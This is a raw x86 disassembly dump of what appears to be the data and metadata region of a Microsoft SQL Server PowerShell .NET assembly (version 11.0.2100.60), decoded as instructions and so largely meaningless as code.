  4056a0:	xchg   BYTE PTR [edx-0x15ce2a3e],bh
  4056a6:	mov    esp,0x6c66cc3a
  4056ab:	das    
  4056ac:	mov    cs,eax
  4056ae:	jns    0x4056aa
  4056b0:	xchg   esp,eax
  4056b1:	clc    
  4056b2:	div    DWORD PTR [eax-0xdd082ce]
  4056b8:	in     eax,dx
  4056b9:	push   edx
  4056ba:	xor    al,0x48
  4056bc:	clc    
  4056bd:	cmp    al,0x3d
  4056bf:	pop    esp
  4056c0:	pop    ebp
  4056c1:	rcr    bh,cl
  4056c3:	(bad)  
  4056c4:	mov    esp,0x6b28c599
  4056c9:	sub    al,0x12
  4056cb:	push   ecx
  4056cc:	pop    ss
  4056cd:	mov    edi,0x2b24be5c
  4056d2:	popf   
  4056d3:	inc    ecx
  4056d4:	jne    0x4056dd
  4056d6:	xor    dh,BYTE PTR [edx+0x49e6ffbd]
  4056dc:	(bad)  
  4056dd:	out    dx,eax
  4056de:	mov    eax,0x526d52e5
  4056e3:	outs   dx,DWORD PTR ds:[esi]
  4056e4:	fst    QWORD PTR [ebx]
  4056e6:	add    BYTE PTR [ebp-0xd842414],dl
  4056ec:	adc    BYTE PTR [eax-0x27259364],al
  4056f2:	or     BYTE PTR [edi-0x56],0x9a
  4056f6:	shl    BYTE PTR [ecx],0xa
  4056f9:	ret    
  4056fa:	retf   
  4056fb:	mov    ds:0x562305aa,al
  405700:	jnp    0x40572f
  405702:	cli    
  405703:	jg     0x4056e7
  405705:	push   eax
  405706:	mov    bl,0xf
  405708:	lods   al,BYTE PTR ds:[esi]
  405709:	mov    ebp,0x99ecd462
  40570e:	mov    ecx,0x7d7cc44a
  405713:	cmp    ebp,DWORD PTR [eax]
  405715:	icebp  
  405716:	mul    ah
  405718:	enter  0x2005,0x1
  40571c:	add    DWORD PTR [ecx],edx
  40571e:	imul   ecx,DWORD PTR [eax],0x20001
  405724:	add    BYTE PTR [eax],al
  405726:	add    BYTE PTR [eax],al
  405728:	push   es
  405729:	add    BYTE PTR [edx],al
  40572b:	push   cs
  40572c:	push   cs
  40572d:	adc    DWORD PTR [ecx+0x7],esi
  405730:	add    BYTE PTR [ebx],al
  405732:	or     BYTE PTR [esi],cl
  405734:	push   cs
  405735:	adc    DWORD PTR [ecx+0x5],edi
  405738:	add    BYTE PTR [edx],al
  40573a:	add    DWORD PTR [esi],ecx
  40573c:	push   cs
  40573d:	add    al,0x6
  40573f:	adc    al,BYTE PTR [eax+0x1200681]
  405745:	adc    al,BYTE PTR [eax+0x20040e81]
  40574b:	add    DWORD PTR [esi+ecx*1],ebx
  40574e:	add    eax,0x80120000
  405753:	lea    eax,[eax+eiz*1]
  405756:	add    BYTE PTR [edx],dl
  405758:	or     DWORD PTR [edx],ecx
  40575a:	and    BYTE PTR [eax],al
  40575c:	adc    eax,0x1918012
  405761:	adc    al,BYTE PTR [eax+0x3000995]
  405767:	push   cs
  405768:	adc    al,BYTE PTR [eax+0x1c1d0e99]
  40576e:	add    eax,0xe010220
  405773:	push   cs
  405774:	or     BYTE PTR ds:0x1918012,dl
  40577a:	adc    al,BYTE PTR [eax+0x1200595]
  405780:	add    DWORD PTR [ebx],edx
  405782:	add    BYTE PTR ds:0x80120000,al
  405788:	mov    eax,ds:0xe002003
  40578d:	add    eax,0xe010220
  405792:	sbb    al,0x6
  405794:	and    BYTE PTR [edx],al
  405796:	add    cl,BYTE PTR [esi]
  405798:	adc    DWORD PTR [ecx+0x8],edi
  40579b:	add    BYTE PTR [ecx],al
  40579d:	adc    al,BYTE PTR [eax-0x527fee57]
  4057a3:	add    eax,0x80120020
  4057a8:	mov    cl,0x8
  4057aa:	and    BYTE PTR [edx],al
  4057ac:	sbb    eax,0xa980121c
  4057b1:	add    al,BYTE PTR [ebx]
  4057b3:	sbb    eax,0x1d034112
  4057b8:	adc    dh,BYTE PTR [ecx]
  4057ba:	add    ebx,DWORD PTR ds:0x92512
  4057c0:	add    al,0x8
  4057c2:	adc    cl,BYTE PTR [ecx]
  4057c4:	push   cs
  4057c5:	push   cs
  4057c6:	sbb    eax,0xe071f0e
  4057cb:	adc    cl,BYTE PTR [ecx]
  4057cd:	push   cs
  4057ce:	push   cs
  4057cf:	push   cs
  4057d0:	adc    al,BYTE PTR [eax-0x727fed7f]
  4057d6:	adc    al,BYTE PTR [eax+0x41121da5]
  4057dc:	sbb    eax,0x121d3112
  4057e1:	and    eax,0x1c1d080e
  4057e6:	sbb    eax,0x51c
  4057eb:	adc    al,BYTE PTR [eax+0x5b9]
  4057f1:	adc    al,BYTE PTR [eax+0x22009bd]
  4057f7:	add    DWORD PTR [edx],edx
  4057f9:	cmp    BYTE PTR [ecx+0x4bd8012],0x0
  405800:	add    DWORD PTR [edx],eax
  405802:	push   cs
  405803:	pop    es
  405804:	add    BYTE PTR [ecx],al
  405806:	adc    al,BYTE PTR [eax+0x509128d]
  40580c:	and    BYTE PTR [eax],al
  40580e:	adc    al,BYTE PTR [eax+0x121508c9]
  405814:	or     ch,0x1
  405817:	adc    al,BYTE PTR [eax+0x200995]
  40581d:	adc    eax,0x1d18012
  405822:	adc    eax,DWORD PTR [eax]
  405824:	or     BYTE PTR ds:0x1d18012,dl
  40582a:	adc    al,BYTE PTR [eax+0x200495]
  405830:	adc    eax,DWORD PTR [eax]
  405832:	add    eax,0x80120020
  405837:	aad    0x3
  405839:	and    BYTE PTR [eax],al
  40583b:	add    al,BYTE PTR ds:0x80120020
  405841:	fisttp QWORD PTR [edx]
  405843:	and    BYTE PTR [eax],al
  405845:	adc    eax,0x1e18012
  40584a:	adc    al,BYTE PTR [eax+0x121508e5]
  405850:	and    cl,0x1
  405853:	adc    al,BYTE PTR [eax+0x2008e5]
  405859:	adc    eax,0x1e18012
  40585e:	sbb    al,0x6
  405860:	adc    eax,0x1e18012
  405865:	sbb    al,0x3
  405867:	and    BYTE PTR [eax],al
  405869:	or     BYTE PTR ds:0x80120020,al
  40586f:	jmp    0x11407879
  405874:	sub    ch,0x5
  405877:	and    BYTE PTR [eax],al
  405879:	adc    al,BYTE PTR [eax+0x2004a5]
  40587f:	adc    cl,BYTE PTR ds:0xe0c0722
  405885:	or     BYTE PTR [edx],dl
  405887:	add    cl,0x12
  40588a:	xor    ch,0x12
  40588d:	or     BYTE PTR [ebp+0x12c98012],0x80
  405894:	xchg   ebp,eax
  405895:	sbb    al,0x12
  405897:	xor    cl,0x8
  40589a:	sbb    eax,0x8012151c
  40589f:	rol    DWORD PTR [ecx],1
  4058a1:	adc    al,BYTE PTR [eax+0x200395]
  4058a7:	sbb    al,0x4
  4058a9:	pop    es
  4058aa:	add    DWORD PTR [edx],edx
  4058ac:	or     eax,0x12012006
  4058b1:	cmp    ch,0xe
  4058b4:	add    eax,0x81120020
  4058b9:	add    DWORD PTR [ecx],ecx
  4058bb:	pop    es
  4058bc:	add    edx,DWORD PTR [edx]
  4058be:	and    BYTE PTR [ebp+0xefd8012],0x4
  4058c5:	add    DWORD PTR [eax],eax
  4058c7:	add    BYTE PTR [eax],al
  4058c9:	push   es
  4058ca:	and    BYTE PTR [edx],al
  4058cc:	push   cs
  4058cd:	push   cs
  4058ce:	adc    dl,BYTE PTR [ecx]
  4058d0:	add    al,0x7
  4058d2:	add    DWORD PTR ds:0x31c,ebx
  4058d8:	add    DWORD PTR ds:0x81120020,eax
  4058de:	or     eax,0x1022007
  4058e3:	push   cs
  4058e4:	adc    al,BYTE PTR [eax+0x105b1]
  4058ea:	add    BYTE PTR [eax],al
  4058ec:	add    BYTE PTR [ecx],bl
  4058ee:	add    DWORD PTR [eax],eax
  4058f0:	adc    al,0x4d
  4058f2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4058f9:	je     0x40591b
  4058fb:	push   ebx
  4058fc:	push   ecx
  4058fd:	dec    esp
  4058fe:	and    BYTE PTR [ebx+0x65],dl
  405901:	jb     0x405979
  405903:	gs jb  0x405906
  405906:	add    BYTE PTR [ecx],ch
  405908:	add    DWORD PTR [eax],eax
  40590a:	and    al,0x4d
  40590c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405913:	je     0x405935
  405915:	inc    ebx
  405916:	outs   dx,DWORD PTR ds:[esi]
  405917:	jb     0x405989
  405919:	and    BYTE PTR cs:[ecx+0x6c],al
  40591d:	ins    BYTE PTR es:[edi],dx
  40591e:	and    BYTE PTR [edx+0x69],dh
  405921:	addr16 push 0x72207374
  405927:	gs jae 0x40598f
  40592a:	jb     0x4059a2
  40592c:	gs fs add BYTE PTR cs:[eax],al
  405931:	sbb    al,BYTE PTR [ecx]
  405933:	add    BYTE PTR ds:0x7263694d,dl
  405939:	outs   dx,DWORD PTR ds:[esi]
  40593a:	jae    0x4059ab
  40593c:	data16 je 0x40595f
  40593f:	inc    ebx
  405940:	outs   dx,DWORD PTR ds:[esi]
  405941:	jb     0x4059b3
  405943:	outs   dx,DWORD PTR ds:[esi]
  405944:	jb     0x4059a7
  405946:	je     0x4059b1
  405948:	outs   dx,DWORD PTR ds:[esi]
  405949:	outs   dx,BYTE PTR ds:[esi]
  40594a:	add    BYTE PTR [eax],al
  40594c:	sub    al,0x1
  40594e:	add    BYTE PTR [edi],ah
  405950:	xor    DWORD PTR [ecx],esi
  405952:	xor    BYTE PTR cs:[esi],ch
  405955:	xor    dh,BYTE PTR [ecx]
  405957:	xor    BYTE PTR [eax],dh
  405959:	cs xor BYTE PTR ss:[eax],ah
  40595d:	sub    BYTE PTR [eax],ch
  40595f:	push   ebx
  405960:	push   ecx
  405961:	dec    esp
  405962:	xor    DWORD PTR [ecx],esi
  405964:	pop    edi
  405965:	push   edx
  405966:	push   esp
  405967:	dec    ebp
  405968:	sub    DWORD PTR [esi],ebp
  40596a:	xor    DWORD PTR [edx],esi
  40596c:	xor    BYTE PTR [edx],dh
  40596e:	xor    DWORD PTR [eax],esi
  405970:	sub    eax,0x36343831
  405975:	and    BYTE PTR [ecx],ch
  405977:	add    BYTE PTR [eax],al
  405979:	adc    DWORD PTR [ecx],eax
  40597b:	add    BYTE PTR [ecx+esi*1],cl
  40597e:	xor    DWORD PTR [esi],ebp
  405980:	xor    BYTE PTR [esi],ch
  405982:	xor    dh,BYTE PTR [ecx]
  405984:	xor    BYTE PTR [eax],dh
  405986:	cs xor BYTE PTR ss:[eax],al
  40598a:	add    BYTE PTR ds:0x65300001,dh
  405990:	cmp    bl,BYTE PTR [ebx+esi*2+0x71]
  405994:	ins    BYTE PTR es:[edi],dx
  405995:	xor    DWORD PTR [ecx],esi
  405997:	pop    edi
  405998:	ins    DWORD PTR es:[edi],dx
  405999:	popa   
  40599a:	imul   ebp,DWORD PTR [esi+0x5f],0x735c5c74
  4059a1:	jno    0x405a0f
  4059a3:	pop    esp
  4059a4:	inc    ebx
  4059a5:	outs   dx,DWORD PTR ds:[esi]
  4059a6:	ins    DWORD PTR es:[edi],dx
  4059a7:	ins    DWORD PTR es:[edi],dx
  4059a8:	outs   dx,DWORD PTR ds:[esi]
  4059a9:	outs   dx,BYTE PTR ds:[esi]
  4059aa:	pop    esp
  4059ab:	push   ebx
  4059ac:	dec    esi
  4059ad:	dec    ebx
  4059ae:	pop    esp
  4059af:	push   ebx
  4059b0:	push   ecx
  4059b1:	dec    esp
  4059b2:	xor    dh,BYTE PTR [eax]
  4059b4:	xor    BYTE PTR [ebx],dh
  4059b6:	push   ebx
  4059b7:	dec    esi
  4059b8:	dec    ebx
  4059b9:	inc    ebp
  4059ba:	pop    ecx
  4059bb:	cs jae 0x405a2c
  4059be:	imul   eax,DWORD PTR [eax],0x0
  4059c1:	add    eax,0x10001
  4059c6:	add    BYTE PTR [ebp+0x1],cl
  4059c9:	add    BYTE PTR [eax+0x4d],cl
  4059cc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4059d3:	je     0x4059f5
  4059d5:	push   ebx
  4059d6:	push   ecx
  4059d7:	dec    esp
  4059d8:	and    BYTE PTR [ebx+0x65],dl
  4059db:	jb     0x405a53
  4059dd:	gs jb  0x405a00
  4059e0:	imul   esi,DWORD PTR [ebx+0x20],0x65722061
  4059e7:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  4059ef:	and    BYTE PTR [edx+esi*2+0x61],dh
  4059f3:	fs gs ins DWORD PTR es:[edi],dx
  4059f6:	popa   
  4059f7:	jb     0x405a64
  4059f9:	and    BYTE PTR [edi+0x66],ch
  4059fc:	and    BYTE PTR [ebp+0x69],cl
  4059ff:	arpl   WORD PTR [edx+0x6f],si
  405a02:	jae    0x405a73
  405a04:	data16 je 0x405a27
  405a07:	inc    ebx
  405a08:	outs   dx,DWORD PTR ds:[esi]
  405a09:	jb     0x405a7b
  405a0b:	outs   dx,DWORD PTR ds:[esi]
  405a0c:	jb     0x405a6f
  405a0e:	je     0x405a79
  405a10:	outs   dx,DWORD PTR ds:[esi]
  405a11:	outs   dx,BYTE PTR ds:[esi]
  405a12:	add    BYTE PTR cs:[eax],al
  405a15:	and    al,0x1
  405a17:	add    BYTE PTR [edi],bl
  405a19:	dec    ebp
  405a1a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405a21:	je     0x405a43
  405a23:	push   ebx
  405a24:	push   ecx
  405a25:	dec    esp
  405a26:	and    BYTE PTR [ebx+0x65],dl
  405a29:	jb     0x405aa1
  405a2b:	gs jb  0x405a4e
  405a2e:	push   eax
  405a2f:	outs   dx,DWORD PTR ds:[esi]
  405a30:	ja     0x405a97
  405a32:	jb     0x405a87
  405a34:	push   0x6c6c65
  405a39:	add    BYTE PTR [edx],bl
  405a3b:	add    DWORD PTR [eax],eax
  405a3d:	adc    eax,0x204c5153
  405a42:	push   ebx
  405a43:	gs jb  0x405abc
  405a46:	gs jb  0x405a69
  405a49:	push   eax
  405a4a:	outs   dx,DWORD PTR ds:[esi]
  405a4b:	ja     0x405ab2
  405a4d:	jb     0x405aa2
  405a4f:	push   0x6c6c65
  405a54:	add    BYTE PTR [edx],cl
  405a56:	add    DWORD PTR [eax],eax
  405a58:	add    eax,0x552d6e65
  405a5d:	push   ebx
  405a5e:	add    BYTE PTR [eax],al
  405a60:	or     BYTE PTR [ecx],al
  405a62:	add    BYTE PTR [eax],cl
  405a64:	add    BYTE PTR [eax],al
  405a66:	add    BYTE PTR [eax],al
  405a68:	add    BYTE PTR [esi],bl
  405a6a:	add    DWORD PTR [eax],eax
  405a6c:	add    DWORD PTR [eax],eax
  405a6e:	push   esp
  405a6f:	add    dl,BYTE PTR [esi]
  405a71:	push   edi
  405a72:	jb     0x405ad5
  405a74:	jo     0x405ac4
  405a76:	outs   dx,DWORD PTR ds:[esi]
  405a77:	outs   dx,BYTE PTR ds:[esi]
  405a78:	inc    ebp
  405a79:	js     0x405ade
  405a7b:	gs jo  0x405af2
  405a7e:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  405a85:	ja     0x405afa
  405a87:	add    DWORD PTR [eax],eax
  405a89:	add    BYTE PTR [eax],al
  405a8b:	add    BYTE PTR [esp+ebx*8+0x35],bl
  405a8f:	dec    edi
  405a90:	add    BYTE PTR [eax],al
  405a92:	add    BYTE PTR [eax],al
  405a94:	add    al,BYTE PTR [eax]
  405a96:	add    BYTE PTR [eax],al
  405a98:	and    al,BYTE PTR [eax]
  405a9a:	add    BYTE PTR [eax],al
  405a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a9d:	pop    edx
  405a9e:	add    BYTE PTR [eax],al
  405aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa1:	dec    edx
  405aa2:	add    BYTE PTR [eax],al
  405aa4:	push   edx
  405aa5:	push   ebx
  405aa6:	inc    esp
  405aa7:	push   ebx
  405aa8:	fdiv   DWORD PTR [ebp+0x70]
  405aab:	pushf  
  405aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aad:	(bad)  
  405aae:	inc    DWORD PTR [ebp-0x68]
  405ab1:	dec    ecx
  405ab2:	into   
  405ab3:	inc    ebx
  405ab4:	stos   BYTE PTR es:[edi],al
  405ab5:	ficomp DWORD PTR [ebx+0x42]
  405ab8:	add    al,BYTE PTR [eax]
  405aba:	add    BYTE PTR [eax],al
  405abc:	push   ebx
  405abd:	push   ecx
  405abe:	dec    esp
  405abf:	push   eax
  405ac0:	push   ebx
  405ac1:	cs jo  0x405b28
  405ac4:	bound  eax,QWORD PTR [eax]
	...
  405b16:	add    BYTE PTR [eax],al
  405b18:	inc    eax
  405b19:	pop    ebx
	...
  405b22:	add    BYTE PTR [eax],al
  405b24:	pop    esi
  405b25:	pop    ebx
  405b26:	add    BYTE PTR [eax],al
  405b28:	add    BYTE PTR [eax],ah
	...
  405b3e:	add    BYTE PTR [eax],al
  405b40:	push   eax
  405b41:	pop    ebx
	...
  405b52:	pop    edi
  405b53:	inc    ebx
  405b54:	outs   dx,DWORD PTR ds:[esi]
  405b55:	jb     0x405b9c
  405b57:	js     0x405bbe
  405b59:	dec    ebp
  405b5a:	popa   
  405b5b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  405b62:	jb     0x405bc9
  405b64:	gs cs fs ins BYTE PTR es:[edi],dx
  405b68:	ins    BYTE PTR es:[edi],dx
  405b69:	add    BYTE PTR [eax],al
  405b6b:	add    BYTE PTR [eax],al
  405b6d:	add    bh,bh
  405b6f:	and    eax,0x402000
